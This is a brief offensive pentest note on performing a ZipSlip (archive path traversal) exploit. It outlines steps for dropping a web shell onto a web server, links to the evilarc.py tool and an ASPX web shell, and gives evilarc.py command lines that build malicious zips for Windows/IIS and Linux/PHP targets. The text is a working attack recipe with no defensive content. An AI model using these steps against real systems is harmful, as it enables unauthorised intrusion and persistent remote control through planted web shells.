Performing ZipSlip Exploit

1. Prepare your payload. If the target is a web server you may need to traverse files to a particular directory to directly access 
the file. Such as a web shell.
2. Have an understanding of where the destination path is. How many directories do you want to traverse to drop these files to.
3. Execute your payload.

1. We will be using evilarc.py for this example.
https://github.com/ptoomey3/evilarc
2. We are attacking an Windows Server using IIS that uses ASP.
3. Let's use evilarc.py to zip our webshell. 
https://github.com/jivoi/pentest/blob/master/shell/insomnia_shell.aspx
python2 evilarc.py -o win -d 1 -p \\ ./evil.aspx
or if you had to attack a linux web server that uses PHP
python2 evilarc.py -o unix -d 3 -p / ./evil.php

evilarc# unzip -l evil.zip
